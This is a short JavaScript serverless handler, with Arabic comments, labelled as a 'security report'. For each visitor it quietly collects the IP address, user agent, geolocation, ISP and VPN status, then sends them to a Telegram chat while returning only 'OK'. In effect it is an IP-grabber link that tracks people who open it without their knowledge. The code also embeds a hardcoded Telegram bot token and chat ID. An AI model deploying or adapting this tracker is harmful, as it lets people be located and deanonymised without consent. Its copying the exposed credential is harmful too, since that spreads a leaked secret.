export default async function handler(req, res) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const botToken = "8677038270:AAF7pXdGVjJDBUgftzoDP0lnJsJEbNPjhpQ";
    const chatId = "5244299184";

    try {
        // جلب معلومات الموقع
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        const geo = await geoRes.json();

        const message = `🚨 **تقرير أمني جديد** 🚨\n\n` +
                        `🌐 **IP:** \`${ip}\`\n` +
                        `📍 **الموقع:** ${geo.country || 'غير معروف'}, ${geo.city || 'غير معروف'}\n` +
                        `🏢 **الشركة:** ${geo.isp || 'غير معروف'}\n` +
                        `🛡️ **الحماية:** ${geo.proxy ? 'VPN/Proxy' : 'اتصال مباشر'}\n\n` +
                        `📱 **الجهاز:** \n\`${userAgent}\``;

        // إرسال لتليجرام
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        });

    } catch (error) {
        console.error(error);
    }

    res.status(200).send("OK");
}
